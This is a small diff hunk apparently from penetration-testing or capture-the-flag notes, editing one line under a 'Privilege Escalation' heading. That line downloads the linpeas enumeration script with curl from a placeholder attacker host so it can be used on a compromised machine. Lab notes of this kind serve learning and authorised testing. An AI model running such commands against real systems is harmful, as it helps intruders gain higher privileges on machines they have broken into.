@@ -145,7 +145,7 @@ https://sha-mbles.github.io/
 
 ## Privilege Escalation
 
-curl -O http://<IP>:80/linpeas.sh
+curl -O http://IP:80/linpeas.sh
 
 ### linpeas gives me the vulnerability
 ```bash
